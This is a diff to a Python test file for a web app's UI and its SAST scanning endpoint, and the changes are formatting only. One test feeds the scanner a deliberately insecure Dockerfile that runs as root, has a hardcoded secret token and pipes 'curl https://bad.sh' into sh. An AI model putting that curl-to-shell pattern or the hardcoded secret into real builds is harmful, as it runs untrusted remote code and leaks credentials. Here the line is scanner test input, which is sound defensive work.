@@ -303,7 +303,6 @@ class Axe4UITestCase(TestCase):
         self.assertIn("max-width: 768px", forge_py)
         self.assertIn("max-width: 480px", forge_py)
 
-
     def test_multilang_demo_snippets_and_language_sync(self):
         """Vérifie la synchronisation multilingue (fr/en/sw/pt) pour SAST & Gemma ainsi que les 4 démos (Python, Dockerfile, YAML, JavaScript)."""
         import json
@@ -322,7 +321,9 @@ class Axe4UITestCase(TestCase):
         self.assertIn('data-demo-type="javascript"', dash_html)
 
         # 2. Scan SAST Dockerfile en anglais (en) et swahili (sw)
-        dockerfile_code = "FROM python:latest\nUSER root\nENV SECRET_TOKEN = 'hardcoded123456'\nRUN curl -sSL https://bad.sh | sh\n"
+        dockerfile_code = (
+            "FROM python:latest\nUSER root\nENV SECRET_TOKEN = 'hardcoded123456'\nRUN curl -sSL https://bad.sh | sh\n"
+        )
         scan_en = self.client.post(
             "/api/security/scan/",
             data=json.dumps({"filename": "Dockerfile", "content": dockerfile_code, "lang": "en"}),
@@ -443,7 +444,6 @@ class Axe4UITestCase(TestCase):
             gemma_data = gemma_resp.json()
             self.assertEqual(gemma_data["action"], "gemma")
             self.assertIn("response", gemma_data)
-
 
     def test_faq_three_steps_closed_by_default_and_gitea_headbar_explore_alignment(self):
         """Vérifie que les 3 étapes fondamentales de la FAQ sont fermées par défaut et que la barre d'en-tête Gitea place les actions après [Explore]."""
